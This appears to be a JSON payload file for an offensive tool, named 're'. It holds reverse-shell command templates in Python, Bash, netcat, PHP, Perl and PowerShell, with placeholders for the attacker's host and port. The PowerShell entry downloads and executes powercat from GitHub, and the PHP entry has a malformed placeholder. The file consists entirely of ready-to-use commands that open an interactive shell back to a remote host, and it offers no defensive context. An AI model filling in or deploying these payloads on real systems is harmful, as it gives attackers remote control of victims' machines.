{
    "name": "re",
    "payload": {
        "python":{
            "number": 2,
            "template": "python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{0}}\",{{1}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
        },
        "bash":{
            "number": 2,
            "template": "bash -c \"bash -i >& /dev/tcp/{{0}}/{{1}} 0>&1\""
        },
        "nc":{
            "number": 2,
            "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{0}} {{1}} >/tmp/f"
        },
        "php":{
            "number": 2,
            "template": "php -r '$sock=fsockopen(\"{{0}}\",{[1}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        },
        "perl":{
            "number": 2,
            "template": "perl -e 'use Socket;$i=\"{{0}}\";$p={{1}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
        },
        "ps":{
            "number": 2,
            "template": "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {{0}} -p {{1}} -e cmd'"
        }
    }
}